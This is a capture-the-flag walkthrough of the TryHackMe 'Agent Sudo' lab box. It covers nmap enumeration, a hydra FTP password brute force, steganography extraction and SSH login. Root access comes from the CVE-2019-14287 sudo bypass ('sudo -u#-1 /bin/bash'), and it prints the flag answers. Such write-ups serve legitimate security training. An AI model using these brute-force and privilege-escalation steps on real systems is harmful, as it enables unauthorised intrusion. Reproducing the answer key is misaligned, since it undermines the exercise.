# TryHackMe [Agent Sudo](https://www.tryhackme.com/room/agentsudoctf)
### References
* Hammond, J. (2020). TryHackMe! Sudo - CVE-2019-14287 [YouTube Video]. In YouTube. https://youtu.be/Ikx6iOocYO0
## Enumerate
### How many open ports?
```bash
$  nmap -vv -sV -sC <MACHINE_IP>
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-08 21:07 AEST
NSE: Loaded 153 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 21:07
Completed NSE at 21:07, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 21:07
Completed NSE at 21:07, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 21:07
Completed NSE at 21:07, 0.00s elapsed
Initiating Ping Scan at 21:07
Scanning <MACHINE_IP> [2 ports]
Completed Ping Scan at 21:07, 0.33s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 21:07
Completed Parallel DNS resolution of 1 host. at 21:07, 4.01s elapsed
Initiating Connect Scan at 21:07
Scanning <MACHINE_IP> [1000 ports]
Discovered open port 80/tcp on <MACHINE_IP>
Discovered open port 22/tcp on <MACHINE_IP>
Discovered open port 21/tcp on <MACHINE_IP>
Increasing send delay for <MACHINE_IP> from 0 to 5 due to 38 out of 126 dropped probes since last increase.
Completed Connect Scan at 21:08, 31.43s elapsed (1000 total ports)
Initiating Service scan at 21:08
Scanning 3 services on <MACHINE_IP>
Completed Service scan at 21:08, 6.94s elapsed (3 services on 1 host)
NSE: Script scanning <MACHINE_IP>.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 21:08
Completed NSE at 21:08, 10.41s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 21:08
Completed NSE at 21:08, 2.25s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 21:08
Completed NSE at 21:08, 0.00s elapsed
Nmap scan report for <MACHINE_IP>
Host is up, received syn-ack (0.31s latency).
Scanned at 2021-05-08 21:07:48 AEST for 55s
Not shown: 997 closed ports
Reason: 997 conn-refused
PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.3
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC5hdrxDB30IcSGobuBxhwKJ8g+DJcUO5xzoaZP/vJBtWoSf4nWDqaqlJdEF0Vu7Sw7i0R3aHRKGc5mKmjRuhSEtuKKjKdZqzL3xNTI2cItmyKsMgZz+lbMnc3DouIHqlh748nQknD/28+RXREsNtQZtd0VmBZcY1TD0U4XJXPiwleilnsbwWA7pg26cAv9B7CcaqvMgldjSTdkT1QNgrx51g4IFxtMIFGeJDh2oJkfPcX6KDcYo6c9W1l+SCSivAQsJ1dXgA2bLFkG/wPaJaBgCzb8IOZOfxQjnIqBdUNFQPlwshX/nq26BMhNGKMENXJUpvUTshoJ/rFGgZ9Nj31r
|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHdSVnnzMMv6VBLmga/Wpb94C9M2nOXyu36FCwzHtLB4S4lGXa2LzB5jqnAQa0ihI6IDtQUimgvooZCLNl6ob68=
|   256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOL3wRjJ5kmGs/hI4aXEwEndh81Pm/fvo8EvcpDHR5nt
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Annoucement
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 21:08
Completed NSE at 21:08, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 21:08
Completed NSE at 21:08, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 21:08
Completed NSE at 21:08, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.67 seconds
```
**Answer**: `3`
### How you redirect yourself to a secret page?
* `http://<MACHINE_IP>/`:
> Dear agents,
>
> Use your own codename as user-agent to access the site.
>
> From,
> Agent R
* `curl "http://<MACHINE_IP>/" -H "User-Agent: C" -L`:
> Attention chris,
>
> Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak!
>
> From,
> Agent R

**Answer**: `User-Agent`
### What is the agent name?
**Answer**: `Chris`
## Hash cracking and brute-force
### FTP password
```bash
$ hydra -l chris -P $(pwd)/rockyou.txt ftp://<MACHINE_IP>
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-05-08 21:15:56
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking ftp://<MACHINE_IP>:21/
[STATUS] 168.00 tries/min, 168 tries in 00:01h, 14344260 to do in 1423:03h, 16 active
[21][ftp] host: <MACHINE_IP>   login: chris   password: crystal
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 14 final worker threads did not complete until end.
[ERROR] 14 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-05-08 21:17:34
```
**Answer**: `crystal`
### ZIP file password
```bash
$ ftp <MACHINE_IP>
ftp> ls
-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
ftp> mget *
mget To_agentJ.txt? y
mget cute-alien.jpg? y
mget cutie.png? y
```
* Extract files from `cutie.png`
  * I could not get `john` to work due to an OpenCL error.
```
$ binwalk -e cutie.png 
DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive, footer length: 22
```

**Answer**: `alien`
### Steganography password
1. `To_agentR.txt`:
> Agent C,
>
> We need to send the picture to 'QXJlYTUx' as soon as possible!
>
> By,
> Agent R
2. Assuming `QXJlYTUx` is Base64:
```bash
$  echo "QXJlYTUx" | base64 -d
Area51
```
**Answer**: `Area51`
### Who is the other agent (in full name)?
1. `steghide extract -sf cute-alien.jpg` with passphrase `Area51` to extract to `message.txt`.
2. `message.txt`:
> Hi james,
>
> Glad you find this message. Your login password is hackerrules!
>
> Don't ask me why the password look cheesy, ask agent R who set this password for you.
>
> Your buddy,
> chris

**Answer**: `James`
### SSH password
**Answer**: `hackerrules!`
## Capture the user flag
### What is the user flag?
1. Login with SSH password `hackerrules!`,
2. list files,
3. extract user flag
```bash
$ ssh james@10.10.174.138
james@agent-sudo:~$ ls
Alien_autospy.jpg  user_flag.txt
james@agent-sudo:~$ cat user_flag.txt 
b03d975e8c92a7c04146cfa7a5a313c7
```
### What is the incident of the photo called?
1. Copy with SSH password `hackerrules!` and command `scp james@10.10.174.138:/home/james/Alien_autospy.jpg .`
2. Google image search yields https://www.foxnews.com/science/filmmaker-reveals-how-he-faked-infamous-roswell-alien-autopsy-footage-in-a-london-apartment

**Answer**: `Roswell alien autopsy`
## Privilege escalation
### CVE number for the escalation
* According to [Red Hat](https://access.redhat.com/security/cve/cve-2019-14287), `CVE-2019-14287` can be used by running `sudo` with user ID of `-1`.

**Answer**: `CVE-2019-14287`
### What is the root flag?
```bash
$ sshpass -p 'hackerrules!' ssh james@10.10.174.138
james@agent-sudo:~$ sudo -l
[sudo] password for james: hackerrules!
Matching Defaults entries for james on agent-sudo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash
james@agent-sudo:~$ sudo -u#-1 /bin/bash
root@agent-sudo:~# cd /root
root@agent-sudo:/root# ls
root.txt
root@agent-sudo:/root# cat root.txt 
To Mr.hacker,

Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine. 

Your flag is 
b53a02f55b57d4439e3341834d70c062

By,
DesKel a.k.a Agent R
```
**Answer**: `b53a02f55b57d4439e3341834d70c062`
### Who is Agent R?
**Answer**: `DesKel`
